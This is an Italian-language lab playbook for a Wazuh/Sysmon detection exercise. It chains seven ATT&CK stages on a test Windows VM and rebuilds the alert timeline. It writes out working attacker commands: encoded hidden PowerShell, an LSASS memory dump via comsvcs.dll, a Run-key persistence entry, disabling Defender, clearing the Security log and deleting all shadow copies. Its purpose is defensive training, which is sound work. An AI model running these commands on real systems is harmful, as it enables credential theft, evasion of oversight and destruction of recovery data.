# Playbook — Attack Chain completa (intrusione end-to-end)

## Metadati

| Campo | Valore |
|---|---|
| Scenario | Intrusione realistica multi-stadio, dall'accesso iniziale all'impatto |
| Platform | Windows (`target-windows`) |
| Prerequisiti | Sysmon + Wazuh Agent attivi; PowerShell admin per alcuni stadi |
| Tactics coperte | Initial Access → Execution → Discovery → Credential Access → Persistence → Defense Evasion → Impact |
| Severity | mista (8 → 15) |

---

## Obiettivo

Mettere in fila le singole tecniche dei playbook precedenti in **una storia coerente di kill-chain**,
come la vivrebbe un SOC analyst durante un incidente reale (es. un ransomware operator: accesso →
ricognizione → furto credenziali → persistenza → disabilita difese → cifra). Ogni stadio genera un
alert su una regola del lab: alla fine hai una **timeline ATT&CK** completa di un singolo incidente.

> ⚠️ Solo nella VM `target-windows`. Esegui gli stadi in ordine e annota l'orario di ciascuno: servirà
> per ricostruire la timeline nel write-up.

---

## La catena (7 stadi)

```
[1] Initial Access  ──►  [2] Execution  ──►  [3] Discovery  ──►  [4] Credential Access
        T1566.001            T1059.001          T1059/T1087           T1003.001
                                                                          │
        [7] Impact   ◄──  [6] Defense Evasion  ◄──  [5] Persistence  ◄────┘
         T1486/T1490          T1562.001/T1070           T1547.001
```

---

### Stadio 1 — Initial Access: documento Office → processo figlio (T1566.001)

Simula una macro malevola: un'app Office che lancia PowerShell. (Qui usiamo `cmd` per "fingere"
winword come parent; con una vera macro il parent sarebbe `winword.exe`.)

```cmd
REM Simula Office che spawna un interprete (macro-like)
cmd.exe /c "powershell -NoProfile -Command Write-Host 'stage1: initial access'"
```
> Alert: regola **100020** (se parent è Office) — in lab senza Office, vedrai comunque l'esecuzione PowerShell dello stadio 2.

### Stadio 2 — Execution: PowerShell offuscato (T1059.001)

```powershell
$cmd = 'Write-Host "stage2: foothold"'
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $enc
```
> Alert: regola **100021 / 100063** (`-EncodedCommand`, `-WindowStyle Hidden`, `-ExecutionPolicy Bypass`).

### Stadio 3 — Discovery: ricognizione host e dominio (T1087/T1059)

```cmd
whoami /all
net user
net group "domain admins" /domain
systeminfo
ipconfig /all
```
> Alert: regole built-in Sysmon (es. 92039 net.exe discovery) — telemetria di reconnaissance.

### Stadio 4 — Credential Access: dump LSASS (T1003.001)

```powershell
$lsass = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass C:\Windows\Temp\lsass.dmp full
```
> Alert: regola **100033** (+ **100025** via Sysmon EID 10). Vedi [T1003.001 playbook](T1003-001_lsass-dumping.md).

### Stadio 5 — Persistence: Registry Run key (T1547.001)

```powershell
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "Updater" -Value "powershell.exe -NoProfile -WindowStyle Hidden -Command Write-Host stage5"
```
> Alert: regola **100022 / 100080** (Sysmon EID 13 su `...\CurrentVersion\Run`).

### Stadio 6 — Defense Evasion: disabilita Defender + pulisci log (T1562.001 / T1070.001)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
wevtutil cl Security
```
> Alert: regole **100095** (Defender) e **100096** (clear event log). Severity 14.

### Stadio 7 — Impact: ransomware (T1490 / T1486)

```cmd
vssadmin delete shadows /all /quiet
```
```powershell
$lab="C:\RansomLab"; New-Item -ItemType Directory $lab -Force | Out-Null
1..10 | % { "data $_" | Out-File "$lab\f$_.docx.locked" }
"YOUR FILES ARE ENCRYPTED (lab sim)" | Out-File "$lab\HOW_TO_DECRYPT.txt"
```
> Alert: regole **100030** (shadow delete) e **100032** (ransom note). Vedi [T1490 playbook](T1490_ransomware-behavior.md).

---

## Verifica della timeline su Wazuh

Filtra tutti gli alert dell'incidente in ordine cronologico:

```
agent.name: "target-windows" AND rule.id: (100020 OR 100021 OR 100063 OR 100025 OR 100033 OR 100022 OR 100080 OR 100095 OR 100096 OR 100030 OR 100032)
```

Ordina per `timestamp` ascendente → ottieni la **kill-chain ricostruita**. Sulla Dashboard, il
modulo **MITRE ATT&CK** mostrerà le tattiche illuminate in sequenza (Initial Access → … → Impact).

### Tabella di triage (da compilare durante l'esercizio)

| Stadio | Ora | rule.id | Tactic | Tecnica | TP? |
|---|---|---|---|---|---|
| 1 Initial Access | | 100020 | Initial Access | T1566.001 | |
| 2 Execution | | 100021/100063 | Execution | T1059.001 | |
| 3 Discovery | | (built-in) | Discovery | T1087 | |
| 4 Credential Access | | 100033/100025 | Credential Access | T1003.001 | |
| 5 Persistence | | 100022/100080 | Persistence | T1547.001 | |
| 6 Defense Evasion | | 100095/100096 | Defense Evasion | T1562.001/T1070 | |
| 7 Impact | | 100030/100032 | Impact | T1490/T1486 | |

---

## Cleanup (esegui tutto a fine esercizio)

```powershell
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -ErrorAction SilentlyContinue
Remove-Item C:\Windows\Temp\lsass.dmp, C:\RansomLab -Recurse -Force -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $false
bcdedit /set {default} recoveryenabled yes 2>$null
```

> Consiglio: prima di iniziare, fai uno **snapshot VirtualBox** della VM (`clean-before-chain`).
> A fine esercizio, ripristina lo snapshot per tornare puliti in un colpo.

---

## Perché è forte per il portfolio

Un singolo write-up basato su questa catena dimostra che sai:
- riconoscere **7 tattiche ATT&CK** in un unico incidente,
- ricostruire una **timeline** dagli alert,
- collegare ogni evento a **detection** e **remediation**,
- ragionare da **incident responder**, non solo da chi scrive regole.
